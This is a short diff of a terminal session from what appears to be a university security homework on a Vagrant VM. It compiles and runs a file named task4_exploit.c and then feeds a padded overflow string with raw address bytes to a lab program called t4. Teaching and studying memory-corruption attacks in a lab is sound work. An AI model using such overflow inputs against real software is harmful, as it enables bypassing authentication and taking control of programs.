@@ -1,3 +1,6 @@
+vagrant@vagrant-ubuntu-trusty-32:~/csci461-hw$ gcc -o exploit task4_exploit.c 
+vagrant@vagrant-ubuntu-trusty-32:~/csci461-hw$ ./exploit
+EGG=AAAAAAAAAAAABBBBBBBBBBBB��
 vagrant@vagrant-ubuntu-trusty-32:~/csci461-hw$ ./t4 AAAAAAAAAAAABBBBBBBBBBBB��
 arg: AAAAAAAAAAAABBBBBBBBBBBB��
 checking auth return
